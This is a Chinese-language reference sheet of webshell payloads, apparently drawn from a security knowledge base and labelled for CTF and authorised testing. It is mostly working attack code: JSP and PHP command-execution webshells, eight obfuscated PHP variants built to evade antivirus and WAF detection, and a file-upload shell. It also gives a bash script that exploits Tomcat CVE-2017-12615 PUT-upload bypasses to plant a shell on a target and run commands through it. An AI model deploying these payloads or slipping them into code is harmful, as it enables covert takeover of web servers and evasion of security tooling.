# Webshell Payload 参考手册

> 来源: wgpsec/AboutSecurity (融合进 skill-web)。纯知识文档，CTF/授权测试用途。

## JSP Webshell 变体

### 标准命令执行 (推荐)

```jsp
<%@ page import="java.util.*,java.io.*" %>
<%
String cmd = request.getParameter("cmd");
if (cmd != null) {
    Process p = Runtime.getRuntime().exec(new String[]{"/bin/sh", "-c", cmd});
    BufferedReader br = new BufferedReader(new InputStreamReader(p.getInputStream()));
    String line;
    while ((line = br.readLine()) != null) { out.println(line); }
    br = new BufferedReader(new InputStreamReader(p.getErrorStream()));
    while ((line = br.readLine()) != null) { out.println(line); }
}
%>
```

### Windows 兼容版

```jsp
<%@ page import="java.util.*,java.io.*" %>
<%
String cmd = request.getParameter("cmd");
if (cmd != null) {
    String os = System.getProperty("os.name").toLowerCase();
    String[] command;
    if (os.contains("win")) {
        command = new String[]{"cmd.exe", "/c", cmd};
    } else {
        command = new String[]{"/bin/sh", "-c", cmd};
    }
    Process p = Runtime.getRuntime().exec(command);
    BufferedReader br = new BufferedReader(new InputStreamReader(p.getInputStream()));
    String line;
    while ((line = br.readLine()) != null) { out.println(line); }
}
%>
```

### 极简版（文件最小化）

```jsp
<%Runtime.getRuntime().exec(request.getParameter("cmd"));%>
```

> 注意：极简版没有回显，只能执行盲命令（如反弹 shell）。

---

## PHP Webshell 变体

### 标准版

```php
<?php
if(isset($_REQUEST['cmd'])){
    echo "<pre>";
    system($_REQUEST['cmd']);
    echo "</pre>";
}
?>
```

### 免杀变体

以下变体用于绕过 WAF/AV 对 `eval`/`system`/`assert` 等关键字的静态检测。

```php
// 1. 字符串拼接 — 避免关键字完整出现
<?php $f='sys'.'tem';if(isset($_REQUEST['cmd'])){$f($_REQUEST['cmd']);}?>

// 2. 变量函数 + base64
<?php @eval(base64_decode($_POST['c']));?>

// 3. 回调函数 — 通过 array_map 执行
<?php array_map(function($v){eval($v);}, [$_POST['c']]);?>

// 4. create_function（PHP <8.0）
<?php $fn=create_function('$a','eval($a);');$fn($_POST['c']);?>

// 5. preg_replace /e 修饰符（PHP <7.0）
<?php @preg_replace('/.*/e',$_POST['c'],'');?>

// 6. usort 回调 — 调用: curl -d "0=phpinfo()&1=1" URL
<?php usort($_POST,'asse'.'rt');?>

// 7. 动态 GET 参数函数 — 调用: ?f=system&c=id
<?php $_GET['f']($_GET['c']);?>

// 8. 异或加密壳 — 运行时解密
<?php $a=("!"^"@").("## "^"`").("## "^"`").("%"^"@").("("^"@").("("^"[");$a($_POST['c']);?>
```

### 文件管理 + 命令执行

```php
<?php
if(isset($_GET['cmd'])){ system($_GET['cmd']); }
if(isset($_FILES['f'])){
    move_uploaded_file($_FILES['f']['tmp_name'], $_FILES['f']['name']);
    echo "uploaded: " . $_FILES['f']['name'];
}
?>
```

### 免杀技巧速查

| 技术 | 原理 | 版本要求 |
|------|------|---------|
| 字符串拼接 | `'sys'.'tem'` 避免关键字 | 全版本 |
| 变量函数 | `$f='assert';$f($code)` | 全版本 |
| 回调函数 | `array_map`/`usort`/`array_filter` + callback | 全版本 |
| 编码嵌套 | base64/rot13/gzinflate 多层 | 全版本 |
| create_function | 动态创建匿名函数 | <8.0 |
| preg_replace /e | 正则替换执行代码 | <7.0 |
| 异或运算 | 字符 XOR 拼出函数名 | 全版本 |
| 图片马 | webshell 追加到图片末尾 + 文件包含 | 需 LFI |

---

## PUT 上传绕过技巧详解

### Tomcat CVE-2017-12615 绕过

Tomcat DefaultServlet 对 `.jsp` 后缀有写入保护，但以下方式可绕过：

| 绕过方式 | URL | 原理 | 平台 |
|---------|-----|------|------|
| 末尾斜杠 | `/shell.jsp/` | 路径规范化时去掉斜杠，但绕过后缀检查 | Linux |
| 末尾空格 | `/shell.jsp%20` | 文件系统自动去掉空格 | Linux/Windows |
| NTFS 数据流 | `/shell.jsp::$DATA` | NTFS 交替数据流 | Windows |
| 末尾点 | `/shell.jsp.` | Windows 自动去掉末尾点 | Windows |

### 操作顺序

```bash
# 1. 先写本地文件
cat > /tmp/shell.jsp << 'EOF'
...webshell代码...
EOF

# 2. 检查文件大小（应 > 200 字节）
wc -c /tmp/shell.jsp

# 3. 按顺序尝试绕过（成功即停止）
for bypass in "/" "%20" "::$DATA"; do
    echo "尝试绕过: $bypass"
    resp=$(curl -s -o /dev/null -w "%{http_code}" -X PUT \
        "http://TARGET:8080/shell.jsp${bypass}" \
        --data-binary @/tmp/shell.jsp)
    echo "响应码: $resp"
    if [ "$resp" = "201" ] || [ "$resp" = "204" ]; then
        echo "上传成功！"
        break
    fi
done

# 4. 验证（注意访问时不带绕过后缀）
curl -s "http://TARGET:8080/shell.jsp?cmd=id"
```

---

## 上传后验证检查清单

1. 访问 webshell URL 不返回 404
2. 传入 `cmd=id` 返回用户信息（非空/非 500）
3. 记录 webshell URL 和参数名（后续利用需要）
4. 测试 `cmd=whoami` 确认执行权限级别

## 清理

测试结束后记得清理上传的 webshell：

```bash
# 通过 webshell 自删除
curl -s "http://TARGET:8080/shell.jsp?cmd=rm%20/usr/local/tomcat/webapps/ROOT/shell.jsp"
```
